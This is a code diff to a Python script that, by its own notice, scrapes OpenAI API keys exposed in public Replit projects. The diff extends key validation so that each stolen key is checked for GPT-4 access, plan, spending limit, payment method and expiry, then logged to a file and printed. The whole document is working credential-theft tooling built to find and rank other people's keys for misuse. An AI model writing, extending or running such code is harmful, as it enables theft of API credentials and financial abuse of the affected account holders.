@@ -5,6 +5,8 @@ import time
 import os
 
 copyright_notice = """
+COPYRIGHT NOTICE:
+
 ading2210/openai-key-scraper: a Python script to scrape OpenAI API keys that are exposed on public Replit projects
 Copyright (C) 2023 ading2210
 
@@ -92,12 +94,34 @@ def perform_search(query, page, sort):
   return list(set(found_keys))
 
 def validate_key(key):
-  validation_url = "https://api.openai.com/v1/models"
+  validation_url = "https://api.openai.com/v1/models/gpt-4"
+  subscription_url = "https://api.openai.com/v1/dashboard/billing/subscription"
+  usage_url = "https://api.openai.com/v1/dashboard/user/usage" #unused
+
   headers = {
     "Authorization": f"Bearer {key}"
   }
   r = requests.get(validation_url, headers=headers)
-  return r.ok
+
+  if r.status_code == 401:
+    return False #token revoked or invalid
+  gpt_4 = r.status_code != 404
+  
+  subscription = requests.get(subscription_url, headers=headers).json()
+  expiration = subscription["access_until"]
+  if expiration < time.time():
+    return False #token expired
+  hard_limit = subscription["hard_limit_usd"]
+  plan_id = subscription["plan"]["id"]
+  payment_method = subscription["has_payment_method"]
+
+  return {
+    "gpt4_allowed": gpt_4,
+    "plan": plan_id,
+    "limit": hard_limit,
+    "payment_method": payment_method,
+    "expiration": expiration
+  }
 
 def log_key(key):
   with open("found_keys.txt", "a") as f:
@@ -116,10 +140,15 @@ def search_all_pages(query):
         continue
       if key in known_keys:
         print(f"Found working key (cached): {key}")
-      elif validate_key(key):
-        valid_keys.append(key)
-        log_key(key)
-        print(f"Found working key: {key}")
+      
+      key_info = validate_key(key)
+      if not key_info:
+        continue
+      
+      valid_keys.append(key)
+      log_key(key)
+      found_message = "Found working key: {key} (gpt4: {gpt4_allowed}, plan: {plan}, limit: {limit}, payment method: {payment_method}, expiration: {expiration})"
+      print(found_message.format(key=key, **key_info))
     
     found_keys += keys
 
